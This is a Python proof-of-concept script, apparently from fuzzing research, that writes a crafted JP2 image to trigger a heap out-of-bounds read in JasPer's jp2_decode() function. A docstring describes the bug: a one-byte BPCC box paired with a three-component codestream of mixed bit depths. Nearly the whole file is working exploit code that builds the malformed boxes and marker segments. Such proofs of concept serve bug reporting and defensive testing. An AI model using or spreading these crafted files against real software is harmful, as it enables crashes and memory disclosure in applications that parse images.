#!/usr/bin/env python3
"""
PoC generator for VULN 002: Heap Buffer Over-read in jp2_decode() BPCC bpcs Array
CWE-125: Out-of-bounds Read

Vulnerability: jp2_dec.c lines 274-281 loops over jas_image_numcmpts(dec->image)
accessing dec->bpcc->data.bpcc.bpcs[i], but bpcs[] was allocated with only
bpcc->numcmpts = box->datalen elements. If BPCC datalen < image numcmpts, OOB read.

Trigger:
  - BPCC box with datalen=1  → bpcs[0..0] allocated
  - JPC SIZ with Csiz=3 and mixed Ssiz values → samedtype=false
  - jp2_decode loops i=0..2 but bpcs has only index 0 → OOB at bpcs[1], bpcs[2]
"""

import struct
import os

OUTPUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/jasper/src_libjasper_jp2_jp2_dec_c'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'vuln_002.jp2')


def make_box(type_bytes, payload):
    """Build a JP2 box: 4-byte length (BE) + 4-byte type + payload."""
    assert len(type_bytes) == 4
    length = 8 + len(payload)
    return struct.pack('>I', length) + type_bytes + payload


def build_jpc_codestream():
    """Build a minimal JPC codestream with 3 components, mixed bit depths."""
    data = b''

    # SOC marker
    data += b'\xff\x4f'

    # SIZ marker segment
    # Lsiz includes the Lsiz field itself (2B) + all fields
    # Fields after Lsiz: Rsiz(2)+Xsiz(4)+Ysiz(4)+XOsiz(4)+YOsiz(4)+
    #                    XTsiz(4)+YTsiz(4)+XTOsiz(4)+YTOsiz(4)+Csiz(2) = 38 bytes
    # Component specs: 3*(Ssiz(1)+XRsiz(1)+YRsiz(1)) = 9 bytes
    # Lsiz = 2 + 38 + 9 = 49? Wait: Lsiz = 2(itself) + 2(Rsiz) + 8*4(8 fields) + 2(Csiz) + 3*3(comps)
    #       = 2 + 2 + 32 + 2 + 9 = 47
    siz_fields = struct.pack('>H', 0)       # Rsiz = 0
    siz_fields += struct.pack('>I', 1)      # Xsiz = 1
    siz_fields += struct.pack('>I', 1)      # Ysiz = 1
    siz_fields += struct.pack('>I', 0)      # XOsiz = 0
    siz_fields += struct.pack('>I', 0)      # YOsiz = 0
    siz_fields += struct.pack('>I', 1)      # XTsiz = 1
    siz_fields += struct.pack('>I', 1)      # YTsiz = 1
    siz_fields += struct.pack('>I', 0)      # XTOsiz = 0
    siz_fields += struct.pack('>I', 0)      # YTOsiz = 0
    siz_fields += struct.pack('>H', 3)      # Csiz = 3
    # Component 0: Ssiz=0x07 (8-bit unsigned), XRsiz=1, YRsiz=1
    siz_fields += b'\x07\x01\x01'
    # Component 1: Ssiz=0x09 (10-bit unsigned) — DIFFERENT depth → samedtype=false
    siz_fields += b'\x09\x01\x01'
    # Component 2: Ssiz=0x07 (8-bit unsigned), XRsiz=1, YRsiz=1
    siz_fields += b'\x07\x01\x01'
    Lsiz = 2 + len(siz_fields)             # = 47
    data += b'\xff\x51' + struct.pack('>H', Lsiz) + siz_fields

    # COD marker segment (Lcod=12)
    # Scod(1) + SGcod[progorder(1)+layers(2)+MCT(1)](4) + SPcod[NL(1)+xcb(1)+ycb(1)+style(1)+xform(1)](5) = 10
    # Lcod = 2 + 10 = 12
    cod_payload = b'\x00'                   # Scod: no options
    cod_payload += b'\x00'                  # SGcod: prog order LRCP
    cod_payload += struct.pack('>H', 1)     # number of layers = 1
    cod_payload += b'\x00'                  # MCT: no multi-component transform
    cod_payload += b'\x00'                  # SPcod NL: 0 decomp levels
    cod_payload += b'\x02'                  # xcb: code-block width (4 samples)
    cod_payload += b'\x02'                  # ycb: code-block height (4 samples)
    cod_payload += b'\x00'                  # code-block style
    cod_payload += b'\x01'                  # transform: 5/3 reversible (lossless)
    data += b'\xff\x52' + struct.pack('>H', 12) + cod_payload

    # QCD marker segment
    # No quantization (lossless, reversible transform)
    # Sqcd=0x00: no quant, 0 guard bits; 1 SPqcd byte per subband
    # With 0 decomp levels, 1 subband (LL0) → 1 step value
    # Lqcd = 2 + 1 + 1 = 4
    qcd_payload = b'\x00'                   # Sqcd: no quantization
    qcd_payload += b'\x00'                  # step for LL subband
    data += b'\xff\x5c' + struct.pack('>H', 4) + qcd_payload

    # SOT marker segment (Lsot=10)
    # Isot(2)+Psot(4)+TPsot(1)+TNsot(1) = 8; Lsot = 2+8 = 10
    sot_fields = struct.pack('>H', 0)       # Isot = 0 (tile 0)
    sot_fields += struct.pack('>I', 0)      # Psot = 0 (indeterminate length)
    sot_fields += b'\x00'                   # TPsot = 0 (first tile-part)
    sot_fields += b'\x01'                   # TNsot = 1 (total tile-parts)
    data += b'\xff\x90' + struct.pack('>H', 10) + sot_fields

    # SOD marker (start of data / tile bitstream)
    data += b'\xff\x93'

    # Minimal tile bitstream: a few zero bytes
    # JasPer may tolerate a short/empty bitstream for a 1x1 image
    data += b'\x00\x00\x00\x00'

    # EOC marker
    data += b'\xff\xd9'

    return data


def build_jp2():
    # JP2 Signature box (12 bytes total, fixed)
    sig_box = struct.pack('>I', 12) + b'jP  ' + b'\x0d\x0a\x87\x0a'

    # File Type box
    # brand=jp2 , minv=0, compat list=[jp2 ]
    ftyp_payload = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '
    ftyp_box = make_box(b'ftyp', ftyp_payload)

    # ihdr box (Image Header)
    # height(4)+width(4)+ncomp(2)+bpc(1)+c(1)+unk(1)+ip(1) = 14 bytes
    # bpc=0xFF = JP2_IHDR_BPCNULL → signals that BPCC box provides per-component depths
    ihdr_payload = struct.pack('>I', 1)         # height = 1
    ihdr_payload += struct.pack('>I', 1)        # width = 1
    ihdr_payload += struct.pack('>H', 3)        # ncomp = 3
    ihdr_payload += b'\xff'                     # bpc = 0xFF (BPCC present)
    ihdr_payload += b'\x07'                     # compression type (7 = JP2 codestream)
    ihdr_payload += b'\x01'                     # UnkC = 1 (unknown colorspace)
    ihdr_payload += b'\x00'                     # IPR = 0 (no IP rights)
    ihdr_box = make_box(b'ihdr', ihdr_payload)

    # colr box (Color Specification)
    # meth=1 (enumerated), prec=0, approx=0, enumcs=16 (sRGB)
    colr_payload = b'\x01'                      # meth = 1 (enumerated colorspace)
    colr_payload += b'\x00'                     # prec = 0
    colr_payload += b'\x00'                     # approx = 0
    colr_payload += struct.pack('>I', 16)       # enumcs = 16 (sRGB)
    colr_box = make_box(b'colr', colr_payload)

    # BPCC box (Bits Per Component) — KEY: only 1 byte of payload!
    # datalen=1 → bpcc->numcmpts=1 → bpcs[] has 1 element
    # But ihdr says ncomp=3 and JPC has Csiz=3
    # → OOB read when loop accesses bpcs[1] and bpcs[2]
    bpcc_payload = b'\x07'                      # bpc for component 0 only (1 byte)
    bpcc_box = make_box(b'bpcc', bpcc_payload)

    # jp2h superbox (JP2 Header)
    jp2h_payload = ihdr_box + colr_box + bpcc_box
    jp2h_box = make_box(b'jp2h', jp2h_payload)

    # jp2c box (Contiguous Codestream)
    jpc_data = build_jpc_codestream()
    jp2c_box = make_box(b'jp2c', jpc_data)

    return sig_box + ftyp_box + jp2h_box + jp2c_box


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    jp2_data = build_jp2()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(jp2_data)
    print(f"Generated: {OUTPUT_FILE} ({len(jp2_data)} bytes)")

    # Print hex dump of key sections for debugging
    print(f"File size: {len(jp2_data)} bytes")
    print(f"JPC codestream size: {len(build_jpc_codestream())} bytes")


if __name__ == '__main__':
    main()
